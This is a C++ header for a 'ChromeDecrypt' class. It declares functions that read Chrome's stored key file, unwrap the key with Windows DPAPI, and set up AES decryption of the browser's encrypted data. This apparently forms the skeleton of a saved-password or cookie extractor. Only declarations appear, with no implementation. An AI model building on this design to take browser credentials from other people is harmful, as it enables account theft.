#pragma once

#include "cJson.h"
#include "common.h"

#define DPAPI_PREFIX_LEN 5
#define MAX_SIZE 1024

class ChromeDecrypt
{
public:
	ChromeDecrypt();
	~ChromeDecrypt();
	bool initDecryptor(const String& path);
	bool decrypt(const String& encrypted, String& decrypted, int size);
	String getAppFolder(int CSIDL_FLAG);

private:
	//decrypt functions + paramaters
	BCRYPT_ALG_HANDLE m_algHandler;
	BCRYPT_KEY_HANDLE m_keyHandler;
	char* m_tempSaver;


	std::function<f_BCryptDecrypt>                  m_BCryptDecrypt;
	std::function<f_CryptUnprotectData>             m_CryptUnprotectData;
	std::function<f_BCryptOpenAlgorithmProvider>    m_BCryptOpenAlgorithmProvider;
	std::function<f_BCryptSetProperty>              m_BCryptSetProperty;
	std::function<f_BCryptGenerateSymmetricKey>     m_BCryptGenerateSymmetricKey;

	bool getChromeKey(std::string& key, unsigned long& size, const String& path);
	bool decryptKey(std::string key, DWORD size, char* decKey);
	bool decryptDPAPI(unsigned char* encData, unsigned long size, char* decData);
	bool initHandlers(PBYTE key, ULONG size);
	cJSON* findNode(cJSON* node, const char* key);
	bool isFileExists(const std::string& file);
	bool readFile(const String& path, String& data);
};